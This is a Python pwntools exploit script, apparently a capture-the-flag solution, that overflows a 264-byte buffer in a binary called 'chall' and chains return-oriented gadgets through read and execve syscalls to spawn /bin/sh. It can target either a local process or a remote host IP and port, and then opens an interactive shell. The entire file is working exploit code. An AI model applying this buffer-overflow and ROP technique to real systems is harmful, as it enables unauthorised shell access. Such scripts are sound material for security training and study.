from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "13.231.207.73"
PORT = 9010 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_bss = elf.bss()

rdi_ret = 0x40141c
rsi_r15_ret = 0x40141a
rdx_ret = 0x4023f5
rax_ret = 0x400121
syscall_ret = 0x4024dd

def exploit():
	conn.recvline()
	bufsize = 264
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(0)
	payload += p64(rsi_r15_ret)
	payload += p64(addr_bss)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0x20)
	payload += p64(rax_ret)
	payload += p64(0)
	payload += p64(syscall_ret)
	
	payload += p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_r15_ret)
	payload += p64(addr_bss+0x8)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0)
	payload += p64(rax_ret)
	payload += p64(59)
	payload += p64(syscall_ret)
	
	conn.sendline(payload)
	
	payload = "/bin/sh"
	payload += p64(0)
	payload += p64(0)
	
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
